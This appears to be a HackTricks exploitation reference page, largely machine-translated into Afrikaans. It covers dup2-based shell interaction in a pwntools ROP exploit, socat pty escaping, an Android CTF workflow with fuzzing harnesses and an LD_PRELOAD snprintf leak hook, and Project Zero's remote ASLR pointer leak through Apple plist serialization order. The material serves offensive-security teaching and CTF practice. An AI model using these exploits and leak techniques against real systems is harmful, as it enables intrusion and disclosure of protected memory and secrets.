# Common Exploiting Problems

{{#include ../banners/hacktricks-training.md}}

## FDs in Remote Exploitation

Wanneer 'n exploit na 'n remote server gestuur word wat byvoorbeeld **`system('/bin/sh')`** aanroep, sal dit natuurlik in die serverproses uitgevoer word, en `/bin/sh` sal insette vanaf stdin (FD: `0`) verwag en die uitset na stdout en stderr (FDs `1` en `2`) stuur. Dus sal die aanvaller nie met die shell kan interakteer nie.

'n Manier om dit reg te stel is om aan te neem dat toe die server begin het dit die **FD number `3`** geskep het (vir listening) en dat jou verbinding dan in die **FD number `4`** gaan wees. Daarom is dit moontlik om die syscall **`dup2`** te gebruik om die stdin (FD 0) en die stdout (FD 1) na die FD 4 (die een van die aanvaller se verbinding) te dupliseer, sodat dit haalbaar sal wees om kontak met die shell te maak sodra dit uitgevoer word.

[**Exploit example from here**](https://ir0nstone.gitbook.io/notes/types/stack/exploiting-over-sockets/exploit)
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = remote('localhost', 9001)

rop = ROP(elf)
rop.raw('A' * 40)
rop.dup2(4, 0)
rop.dup2(4, 1)
rop.win()

p.sendline(rop.chain())
p.recvuntil('Thanks!\x00')
p.interactive()
```
## Socat & pty

Neem kennis dat socat reeds **`stdin`** en **`stdout`** na die socket stuur. Echter, die `pty`-modus **sluit DELETE-karakters in**. As jy `\x7f` stuur (`DELETE`), sal dit die vorige karakter van jou exploit **verwyder**.

Om dit te omseil, moet die **escape character `\x16` voor enige `\x7f` geplaas word.**

**Hier kan jy** [**'n voorbeeld van hierdie gedrag vind**](https://ir0nstone.gitbook.io/hackthebox/challenges/pwn/dream-diary-chapter-1/unlink-exploit)**.**

## Android AArch64 shared-library fuzzing & LD_PRELOAD hooking

Wanneer 'n Android-app slegs 'n gestripe AArch64 `.so` lewer, kan jy steeds die geëksporteerde logika direk op die toestel fuzz sonder om die APK te herbou. 'n Praktiese werkvloei:

1. **Lokaliseer aanroepbare entry-punte.** `objdump -T libvalidate.so | grep -E "validate"` lys vinnig die geëksporteerde funksies. Decompilers (Ghidra, IDA, BN) openbaar die werklike handtekening, bv. `int validate(const uint8_t *buf, uint64_t len)`.
2. **Skryf 'n selfstandige harness.** Laai 'n lêer, hou die buffer lewendig, en roep die geëksporteerde symbool op presies soos die app dit sou doen. Kruis-kompileer met die NDK (bv. `aarch64-linux-android21-clang harness.c -L. -lvalidate -fPIE -pie`).

<details>
<summary>Minimale lêer-gedrewe harness</summary>
```c
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>

extern int validate(const uint8_t *buf, uint64_t len);

int main(int argc, char **argv) {
if (argc < 2) return 1;
int fd = open(argv[1], O_RDONLY);
if (fd < 0) return 1;
struct stat st = {0};
if (fstat(fd, &st) < 0) return 1;
uint8_t *buffer = malloc(st.st_size + 1);
read(fd, buffer, st.st_size);
close(fd);
int ret = validate(buffer, st.st_size);
free(buffer);
return ret;
}
```
</details>

3. **Herbou die verwagte struktuur.** Foutboodskappe en vergelykings in Ghidra het getoon dat die funksie streng JSON met konstante sleutels (`magic`, `version`, geneste `root.children.*`) en rekenkundige kontroles (bv. `value * 2 == 84` ⇒ `value` moet `42` wees) ontleed. Deur sintakties geldige JSON te voorsien wat elke tak geleidelik bevredig, kan jy die skema karteer sonder instrumentasie.
4. **Omseil anti-debug om geheime te leak.** Omdat die `.so` `snprintf` invoer, oorstreep dit met `LD_PRELOAD` om sensitiewe format strings te dump selfs wanneer breakpoints geblokkeer is:

<details>
<summary>Minimale snprintf leak hook</summary>
```c
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdarg.h>
#include <stdio.h>
#include <string.h>

typedef int (*vsnprintf_t)(char *, size_t, const char *, va_list);

int snprintf(char *str, size_t size, const char *fmt, ...) {
static vsnprintf_t real_vsnprintf;
if (!real_vsnprintf)
real_vsnprintf = (vsnprintf_t)dlsym(RTLD_NEXT, "vsnprintf");

va_list args;
va_start(args, fmt);
va_list args_copy;
va_copy(args_copy, args);
if (fmt && strstr(fmt, "MHL{")) {
fprintf(stdout, "[LD_PRELOAD] flag: ");
vfprintf(stdout, fmt, args);
fputc('\n', stdout);
}
int ret = real_vsnprintf(str, size, fmt, args_copy);
va_end(args_copy);
va_end(args);
return ret;
}
```
</details>

`LD_PRELOAD=./hook.so ./validate_harness payload.json` exfiltrates the internal flag and confirms the crash oracle without patching the binary.
5. Verminder die fuzz-ruimte. Disassembly het 'n XOR-sleutel blootgestel wat hergebruik is oor die flag-vergelyking, wat beteken die eerste sewe bytes van `flag` was bekend. Fuzz slegs die nege onbekende bytes.
6. Voeg fuzz-bytes binne 'n geldige JSON-omhulsel. Die AFL harness lees presies nege bytes vanaf stdin, kopieer dit in die `flag`-sufiks, en hard-codeer elke ander veld (konstantes, tree depths, arithmetic preimage). Enige foutiewe lees verlaat eenvoudig, so AFL bestee siklusse aan sinvolle toetsgevalle:

<details>
<summary>Minimale AFL harness</summary>
```c
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

extern int validate(unsigned char *bytes, size_t len);

#define FUZZ_SIZE 9

int main(void) {
uint8_t blob[FUZZ_SIZE];
if (read(STDIN_FILENO, blob, FUZZ_SIZE) != FUZZ_SIZE) return 0;
char suffix[FUZZ_SIZE + 1];
memcpy(suffix, blob, FUZZ_SIZE);
suffix[FUZZ_SIZE] = '\0';
char json[512];
int len = snprintf(json, sizeof(json),
"{\"magic\":16909060,\"version\":1,\"padding\":0,\"flag\":\"MHL{827b07c%s}\"," \
"\"root\":{\"type\":16,\"level\":3,\"num_children\":1,\"children\":[" \
"{\"type\":32,\"level\":2,\"num_children\":1,\"subchildren\":[" \
"{\"type\":48,\"level\":1,\"num_children\":1,\"leaves\":[" \
"{\"type\":64,\"level\":0,\"reserved\":0,\"value\":42}]}}]}}",
suffix);
if (len <= 0 || (size_t)len >= sizeof(json)) return 0;
validate((unsigned char *)json, len);
return 0;
}
```
</details>

7. **Run AFL with the crash-as-success oracle.** Any input that satisfies every semantic check and guesses the correct nine-byte suffix triggers the deliberate crash; those files land in `output/crashes` and can be replayed through the simple harness to recover the secret.

This workflow lets you triage anti-debug-protected JNI validators quickly, leak secrets when needed, then fuzz only the meaningful bytes, all without touching the original APK.

## Pointer-Keyed Hash Table Pointer Leaks on Apple Serialization

### Requirements & attack surface

- A service accepts attacker-controlled property lists (XML or binary) and calls `NSKeyedUnarchiver.unarchivedObjectOfClasses` with a permissive allowlist (e.g., `NSDictionary`, `NSArray`, `NSNumber`, `NSString`, `NSNull`).
- The resulting objects are reused and later serialized again with `NSKeyedArchiver` (or iterated in deterministic bucket order) and sent back to the attacker.
- Some key type in the containers uses pointer values as its hash code. Before March 2025, `CFNull`/`NSNull` fell back to `CFHash(object) == (uintptr_t)object`, and deserialization always returned the shared-cache singleton `kCFNull`, giving a stable kernel-shared pointer without memory corruption or timing.

### Controllable hashing primitives

- **Pointer-based hashing:** `CFNull`’s `CFRuntimeClass` lacks a hash callback, so `CFBasicHash` uses the object address as the hash. Because the singleton lives at a fixed shared-cache address until reboot, its hash is stable across processes.
- **Attacker-controlled hashes:** 32-bit `NSNumber` keys are hashed through `_CFHashInt`, which is deterministic and attacker-controllable. Picking specific integers lets the attacker choose `hash(number) % num_buckets` for any table size.
- **`NSDictionary` implementation:** Immutable dictionaries embed a `CFBasicHash` with a prime bucket count chosen from `__CFBasicHashTableSizes` (e.g., 23, 41, 71, 127, 191, 251, 383, 631, 1087). Collisions are handled with linear probing (`__kCFBasicHashLinearHashingValue`), and serialization walks buckets in numeric order; therefore, the order of serialized keys encodes the bucket index that each key finally occupied.

### Encoding bucket indices into serialization order

By crafting a plist that materializes a dictionary whose buckets alternate between occupied and empty slots, the attacker constrains where linear probing can place `NSNull`. For a 7-bucket example, filling even buckets with `NSNumber` keys produces:
```text
bucket:          0 1 2 3 4 5 6
occupancy:       # _ # _ # _ #
```
During deserialization die slagoffer voeg die enkele `NSNull` sleutel in. Its initial bucket is `hash(NSNull) % 7`, but probing advances until hitting one of the open indices {1,3,5}. The serialized key order reveals which slot was used, disclosing whether the pointer hash modulo 7 lies in {6,0,1}, {2,3}, or {4,5}. Because the aanvaller controls the original serialized order, the `NSNull` key is emitted last in the input plist so the post-reserialization ordering is solely a function of bucket placement.

### Presiese residuë oplos met komplementêre tabelle

A single dictionary only leaks a range of residues. Om die presiese waarde van `hash(NSNull) % p` te bepaal, bou **twee** dictionaries vir elke priem-bucket-grootte `p`: een met ewe buckets voorafgevul en een met onewe buckets voorafgevul. Vir die komplementêre patroon (`_ # _ # _ # _`), die leë slote (0,2,4,6) kom ooreen met residu-stelle {0}, {1,2}, {3,4}, {5,6}. Observing the serialized position of `NSNull` in both dictionaries beperk die residu tot 'n enkele waarde omdat die kruising van die twee kandidaatstelle 'n unieke `r_i` vir daardie `p` gee.

Die aanvaller pak al die dictionaries saam in 'n `NSArray`, so 'n enkele deserialize → serialize round trip leaks residuë vir elke gekose tabelgrootte.

### Rekonstrueer die 64-bit shared-cache pointer

Vir elke priem `p_i ∈ {23, 41, 71, 127, 191, 251, 383, 631, 1087}`, die aanvaller herkry `hash(NSNull) ≡ r_i (mod p_i)` uit die serialized ordening. Die toepassing van die Chinese Remainder Theorem (CRT) met die extended Euclidean algorithm lewer:
```text
Π p_i = 23·41·71·127·191·251·383·631·1087 = 0x5ce23017b3bd51495 > 2^64
```
so die gekombineerde residu is uniek gelyk aan die 64-bit pointer na `kCFNull`. Die Project Zero PoC kombineer iteratief kongruensies terwyl dit tussentydse moduli druk om konvergensie na die werklike adres (`0x00000001eb91ab60` op die kwesbare build) te toon.

### Praktiese werkvloei

1. **Generate crafted input:** Bou die aanvaller-kant XML plist (two dictionaries per prime, `NSNull` serialized last) en skakel dit na binaire formaat om.
```bash
clang -o attacker-input-generator attacker-input-generator.c
./attacker-input-generator > attacker-input.plist
plutil -convert binary1 attacker-input.plist
```
2. **Victim round trip:** Die slagoffer-diens deserialiseer met `NSKeyedUnarchiver.unarchivedObjectOfClasses` en gebruik die toegelate klasseset `{NSDictionary, NSArray, NSNumber, NSString, NSNull}` en serialiseer onmiddellik weer met `NSKeyedArchiver`.
3. **Residu-ekstraksie:** Deur die teruggestuurde plist weer na XML om te skakel, openbaar dit die sleutelvolgorde van die dictionaries. ’n Hulptoepassing soos `extract-pointer.c` lees die object table, bepaal die indeks van die singleton `NSNull`, koppel elke dictionary-paar terug na sy bucket-residu, en los die CRT-stelsel op om die shared-cache pointer te herstel.
4. **Verification (optional):** Deur ’n klein Objective-C helper te kompileer wat `CFHash(kCFNull)` druk, bevestig jy dat die leaked waarde ooreenstem met die werklike adres.

Geen geheue-veiligheidsfout is nodig nie — bloot die waarneming van die serialisasie-volgorde van pointer-keyed strukture gee ’n remote ASLR bypass primitive.

## Related pages

{{#ref}}
common-exploiting-problems-unsafe-relocation-fixups.md
{{#endref}}

{{#ref}}
../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

{{#ref}}
../reversing/reversing-tools-basic-methods/README.md
{{#endref}}

## References

- [FD duplication exploit example](https://ir0nstone.gitbook.io/notes/types/stack/exploiting-over-sockets/exploit)
- [Socat delete-character behaviour](https://ir0nstone.gitbook.io/hackthebox/challenges/pwn/dream-diary-chapter-1/unlink-exploit)
- [FuzzMe – Reverse Engineering and Fuzzing an Android Shared Library](https://hackmd.io/@sal/fuzzme-mobilehackinglab-ctf-writeup)
- [Pointer leaks through pointer-keyed data structures (Project Zero)](https://projectzero.google/2025/09/pointer-leaks-through-pointer-keyed.html)

{{#include ../banners/hacktricks-training.md}}
